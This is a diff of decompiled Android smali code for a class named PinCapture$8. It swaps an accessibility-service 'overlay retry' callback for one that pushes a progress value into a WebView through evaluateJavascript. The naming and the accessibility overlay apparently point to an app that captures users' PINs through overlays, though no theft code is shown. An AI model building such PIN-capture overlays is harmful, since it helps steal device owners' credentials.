@@ -8,7 +8,7 @@
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingMethod;
-    value = Lcom/lite/cloudfinder/pin/PinCapture;->addOverlay(Landroid/accessibilityservice/AccessibilityService;)V
+    value = Lcom/lite/cloudfinder/pin/PinCapture;->updateOverlayProgress(I)V
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -18,11 +18,13 @@
 
 
 # instance fields
-.field final synthetic val$s2:Landroid/accessibilityservice/AccessibilityService;
+.field final synthetic val$pct:I
+
+.field final synthetic val$wv:Landroid/webkit/WebView;
 
 
 # direct methods
-.method constructor <init>(Landroid/accessibilityservice/AccessibilityService;)V
+.method constructor <init>(Landroid/webkit/WebView;I)V
     .locals 0
     .annotation system Ldalvik/annotation/Signature;
         value = {
@@ -30,8 +32,10 @@
         }
     .end annotation
 
-    .line 1152
-    iput-object p1, p0, Lcom/lite/cloudfinder/pin/PinCapture$8;->val$s2:Landroid/accessibilityservice/AccessibilityService;
+    .line 1074
+    iput-object p1, p0, Lcom/lite/cloudfinder/pin/PinCapture$8;->val$wv:Landroid/webkit/WebView;
+
+    iput p2, p0, Lcom/lite/cloudfinder/pin/PinCapture$8;->val$pct:I
 
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
@@ -41,33 +45,48 @@
 
 # virtual methods
 .method public run()V
-    .locals 2
+    .locals 3
 
-    .line 1155
-    new-instance v0, Ljava/lang/StringBuilder;
+    const-string v0, "window.__setProgress("
 
-    const-string v1, "overlay retry "
+    .line 1078
+    :try_start_0
+    iget-object v1, p0, Lcom/lite/cloudfinder/pin/PinCapture$8;->val$wv:Landroid/webkit/WebView;
 
-    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+    new-instance v2, Ljava/lang/StringBuilder;
 
-    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->access$1300()I
+    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
 
-    move-result v1
+    iget v0, p0, Lcom/lite/cloudfinder/pin/PinCapture$8;->val$pct:I
 
-    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
 
-    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    const-string v0, ")"
+
+    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
 
     move-result-object v0
 
+    const/4 v2, 0x0
+
+    invoke-virtual {v1, v0, v2}, Landroid/webkit/WebView;->evaluateJavascript(Ljava/lang/String;Landroid/webkit/ValueCallback;)V
+    :try_end_0
+    .catchall {:try_start_0 .. :try_end_0} :catchall_0
+
+    goto :goto_0
+
+    :catchall_0
+    move-exception v0
+
+    .line 1081
     const-string v1, "PinCapture"
 
-    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    const-string v2, "progress eval failed"
 
-    .line 1156
-    iget-object v0, p0, Lcom/lite/cloudfinder/pin/PinCapture$8;->val$s2:Landroid/accessibilityservice/AccessibilityService;
+    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
 
-    invoke-static {v0}, Lcom/lite/cloudfinder/pin/PinCapture;->access$1400(Landroid/accessibilityservice/AccessibilityService;)V
-
+    :goto_0
     return-void
 .end method
